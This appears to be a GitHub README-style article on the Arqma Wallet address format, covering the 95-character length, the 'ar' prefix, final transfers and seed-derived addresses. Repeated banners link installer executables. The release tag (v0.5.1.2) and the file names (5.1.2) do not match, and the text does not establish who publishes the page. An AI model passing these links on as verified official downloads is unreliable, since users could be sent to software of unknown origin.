![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet address format: 95 characters and the `ar` prefix</h1>

<p align="center">Why an ARQ address is 95 characters and where the prefixes come from.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

An ARQ address is 95 characters long and begins with `ar`, and a transfer to one is final once broadcast. Those are the documented properties of the format, and they are enough to answer what most people actually need to know: how long a valid address is, what it starts with, and why a mistake cannot be undone afterwards.

## The two documented properties

The length is 95 characters. The prefix is `ar`. Both are fixed, and both come from the project's own description of its address format rather than from any particular wallet screen.

Everything else people believe about addresses  -  that a shortened one works, that a rewritten one still points at the same wallet, that a typo lands somewhere recoverable  -  contradicts one of those two properties or the finality rule that follows them.

## Why the length matters in practice

A 95-character string is long enough that nobody types it correctly by hand and short enough to paste anywhere. Copies get truncated by chat clients, wrapped in emails, broken across lines in a spreadsheet, or clipped by a form field.

A partial copy is not a shorter address; it is not an address. The practical form of that statement: if what you have is not 95 characters beginning with `ar`, it is not an ARQ address and nothing will send to it.

## What the `ar` prefix tells you

The prefix identifies the string as an ARQ address. A string that begins with something else is an address for something else, or not an address at all.

That single check answers the most common rejection: an address copied from a different network, or one produced by a page that is not this project, does not carry the prefix and is refused before any funds move.

## Sends are final

This is the property that makes the other two matter. A transfer cannot be reversed  -  not by the wallet, not by the project, not by anyone. There is no recall, no dispute process and no administrative override.

So the checks happen before the send rather than after, and the only useful question about a destination is asked while the form is still open. [Arqma stuck transaction fix](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-stuck-transaction.md) covers what a slow but valid send means, which is a different problem with a different answer.

## What the wallet needs before it can build a transfer

A transfer names a destination, and the destination has to be an address the wallet can read: 95 characters beginning with `ar`. Anything else is not a destination, so there is nothing to sign.

That is why a rejected paste stops the process at the form rather than at the network. The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) reads the same format as every build before it, which is why an address recorded years ago is still usable today.

## Where an address comes from

An address is not stored in a file you can lose, and it is not registered anywhere. It is produced from the wallet's seed, which is why a restore from the same 25 words reproduces the same addresses on any machine and in any of the interfaces.

That last point is documented directly: one seed and one wallet format across GUI, CLI and mobile. The address therefore identifies the wallet rather than a device, and losing a device does not change it. [Arqma Wallet restore from seed](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-restore-from-seed.md) covers the rebuild path.

The same property is why an address can be published once and keep working. It is not tied to an installation, a version or a machine, so nothing about updating the application changes where funds are sent. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers what publishing an address does and does not reveal about the rest of the wallet.

## Why an address you were given deserves a check

The explorer is public and reads the chain directly. Looking up an address there shows whether it has ever received anything and what it has received, which is the only independent evidence available before you send to it.

That is not a guarantee about who controls it, because the chain records amounts and not identities. It is a check on whether the address exists in the history you think it does.

## Do you need a payment ID?

No. A normal send needs no payment ID, and the address alone identifies the recipient.

Some services still attach an extra reference to the address they hand out. The wallet validates the string it is given; if the service's string is refused, the form to ask for is the plain address, because a reference that does not match the service's own deposit rules is worse than no reference at all.

## If a send went to the wrong address

Nothing in the wallet can retrieve it. The transaction is final, and the destination is controlled by whoever holds the keys for that address.

The one thing that remains true is that the chain keeps the record: the explorer shows the amount, the block and the destination permanently. That record is what an exchange or a platform can act on if the destination belongs to them. [sending ARQ to an exchange](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-send-to-exchange.md) covers that route.

## Reading an address back safely

The only reliable check on a long string is comparison against the source, character for character at the ends, with the whole string pasted rather than retyped.

Converting an address to an image, or reading one out loud, guarantees the kind of loss that produces a rejected string at best. The format's fixed length is what makes the comparison possible: 95 characters is checkable, and a copy that fails the length is wrong before anything else is examined.

## What the format does not encode

An address does not carry an amount, a note, an expiry or a name. It is a destination and nothing more, so nothing about a payment's purpose travels with it.

That is why a send cannot be conditioned on anything: the wallet names an amount and a destination, and the chain records exactly those two things about the transfer.

## Why an address is not a secret

The chain is public and the explorer shows what an address has received, so publishing one exposes no ability to move funds  -  no address value authorises anything.

What it can do is associate activity with a published destination, which is a question about the chain rather than about the string itself. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers what that association does and does not reveal.

## Where addresses do not appear

An address is not a password, not a login and not a recovery method. It cannot authorise a send, and knowing someone's address gives no access to their funds.

That distinction matters when a page asks for an address to "verify" a wallet: the address is public information, so nothing about providing it is dangerous, and nothing about providing it unlocks anything either. [Arqma wallet scam guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-scams-fake-support.md) covers the requests that do ask for something dangerous.

## FAQ

### How long is an ARQ address?

95 characters, beginning with `ar`.

### Can an address be shortened?

No. A string that is not 95 characters beginning with `ar` is not an ARQ address.

### Do I need a payment ID to receive ARQ?

No. A normal send needs only the address.

### Can a sent transfer be reversed?

No. Sends are final, and no party can recall one.

### Does my address change if I restore the wallet?

No. The same seed produces the same address in every interface.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma stuck transaction fix](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-stuck-transaction.md) | A pending send, its fee and confirmation, and when to stop waiting. |
| [sending ARQ to an exchange](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-send-to-exchange.md) | Moving ARQ to a venue without payment IDs, memos or a lost deposit. |
